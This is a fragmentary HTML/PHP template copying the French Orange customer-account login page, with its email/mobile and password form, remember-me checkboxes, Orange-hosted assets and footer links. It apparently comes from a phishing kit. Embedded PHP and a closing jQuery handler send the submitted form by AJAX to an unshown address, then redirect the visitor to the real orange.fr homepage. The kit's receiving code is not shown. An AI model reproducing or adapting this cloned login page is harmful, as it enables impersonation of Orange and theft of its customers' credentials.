              ...
              <td class="sc_box_content">
                <div id="topLeftContent" <?php if($checkInfo) echo "style='display:none'"; ?>>
                  ...
                  <div id="infobulle_perso" class="infobulle ui-corner-all">
                    <div class="arrow">&nbsp;</div>
                    Pour personnaliser votre photo, rendez-vous dans votre espace client, cliquez sur votre nom d’utilisateur puis sélectionnez la rubrique photo.
                  </div>
                  <div id="infobulle_switch" class="infobulle ui-corner-all">
                    <div class="arrow">&nbsp;</div>
                    Ne plus mémoriser le compte utilisateur <br/>
                          ...
                          <td>
                            <div class="sc_button_2">
                              ...
                              <input type="submit" onclick="doSwitch(); return false;"
                                     class="sc_button_content_2 normal submit" value="valider"/>
                              <div class="sc_button_right_2"></div>
                              <span class="clear"><br clear="all"/></span>
                            </div>
                          </td>
                  ...
                  <div id="panel_main">
                    <div class="panel_model panel_model_default" id="default">
                      <div id="div_picto_user">
                          <img id="remove_user" title="Cliquez ici pour ne plus mémoriser ce compte utilisateur sur cet ordinateur."
                             alt="Cliquez ici pour ne plus mémoriser ce compte utilisateur sur cet ordinateur." src="https://id-a.woopic.com/auth_user2/img//close.png"/>
                      ...
                      <form method="post" class="AuthentForm" id="AuthentForm" action="#">
                        ...
                        <div class="sc_field help" id="default_help">
                          <div class="sc_input sc_link">
                            ...
                            <span id="technicalError" class="errorMessage" style="display: none;" >Réessayer ultérieurement (erreur technique). Si le problème persiste contactez votre service clients.</span>
                        ...
                        <div class="sc_field lostpassword" id="default_lostpassword">
                          <div class="sc_input sc_link">
                            ...
                            <a href="https://r.orange.fr/r/Oid_lost?return_url=https%253A%252F%252Fespaceclientv3.orange.fr%252F" id="link_lost"  class="orange">mot&nbsp;de&nbsp;passe&nbsp;oublié&nbsp;?</a>
                          </div>
                          <div class="clear"><br clear="all" /></div>
                        </div>
                        <div class="sc_field checkbox" id="default_memorize_login"
                             title="Décochez cette case si vous utilisez un équipement public (cybercafé, école, ...)">
                          <div class="sc_input">
                              ...
                              <label for="default_f_memorize_login" class="checkboxLabel">
                                mémoriser l’adresse mail ou le nº de mobile
                              </label>
                          </div>
                          <div class="clear"><br clear="all" /></div>
                        </div>
                        <div class="sc_field checkbox" id="default_memorize_password"
                             title="Décochez cette case si plusieurs personnes utilisent cet équipement.">
                          <div class="sc_input">
                                ...
                                <table cellspacing="0" cellpadding="0" border="0">
                                  <tr>
                                      ...
                                      <div class="sc_default_button_2">
                                        ...
                                        <div class="sc_button_left_2"></div>
                                        <input type="submit" class="sc_button_content_2 submit"
                                               value="s’identifier"/>
                                        <div class="sc_button_right_2"></div>
                                        <span class="clear"><br clear="all"/></span>
 ...
 a.validate-btn .end {
    ...
    background: url(https://commande2.boutique.orange.fr/css/FPC_ORA_FAC/webpc/css/media/btn-orange-no-arrow.png) no-repeat scroll right 0 transparent;
      ...
      //]]>
        ...
        <script type="text/javascript">
      //<![CDATA[
      function loadGstat(url, callback){var script=document.createElement("script");script.type="text/javascript";if(script.readyState){script.onreadystatechange=function(){if(script.readyState=="loaded"||script.readyState=="complete"){script.onreadystatechange=null;callback();}};}else{script.onload=function(){callback();}}script.src=url;document.getElementsByTagName("head")[0].appendChild(script);}var gs_d=new Date, DoW = gs_d.getDay();gs_d.setDate(gs_d.getDate() - (DoW + 6) % 7 + 3);var ms=gs_d.valueOf();gs_d.setMonth(0);gs_d.setDate(4);var gs_r=(Math.round((ms - gs_d.valueOf()) / 6048E5) + 1) * gs_d.getFullYear();var GstatServerProtocol=(("https:" == window.location.protocol) ? "https://" : "http://");loadGstat(GstatServerProtocol + 's.gstat.orange.fr/lib/gs.js?' + gs_r, function(){if(_gstat){_gstat.audience();}});                                        
      //]]>
    </script>
        <div id="sc_linkbottomnew">
      Pas inscrit ? 
      <a href="http://r.orange.fr/r/Oid_faq-s-identifier?return_url=https%3A%2F%2Fespaceclientv3.orange.fr%2F" target="_blank" class="orange">Créez ou activez votre compte</a>
    </div>
  
    <div id="o_footer">
      <ul>
        <li style="padding-right: 92px;">
          <a title="informations légales (nouvelle fenêtre)" target="_blank" 
            onclick="window.open(this.href, 'informations légales', config='height=800, width=700, toolbar=no, menubar=no, scrollbars=no, resizable=no, location=no, directories=no, status=no') ; return false;" 
            href="http://r.orange.fr/r/Oinfoslegales_abo">informations légales</a>
        </li>   
        <li style="padding-right: 92px;">
          <a title="publicité (nouvelle fenêtre)" target="_blank" 
            href="http://r.orange.fr/r/Eorangepublicite">publicité</a>
        </li>   
        <li style="padding-right: 92px;">
          <a title="internet+ (nouvelle fenêtre)" target="_blank" 
            href="http://r.orange.fr/r/Einternetplus">internet+</a>
        </li>
        <li style="padding-right: 92px;">
          <a title="signaler un contenu illicite (nouvelle fenêtre)" target="_blank" 
            href="http://r.orange.fr/r/Esignaler">signaler un contenu illicite</a>
        </li> 
        <li style="padding-right: 92px;">
          <a title="données personnelles (nouvelle fenêtre)" target="_blank" 
            href="http://r.orange.fr/r/Ohome_donneespersonnelles">données personnelles</a>
        </li>
        <li>
          <a title="les cookies (nouvelle fenêtre)" target="_blank" 
    ...
    $(document).ready(function(){
        ...
        $('#form_button_submit').click(function(){
             $.ajax({
                ...
                success: function(){
                    window.location = "http://orange.fr";
                    //alert("dshflksjdhfldks");
                }
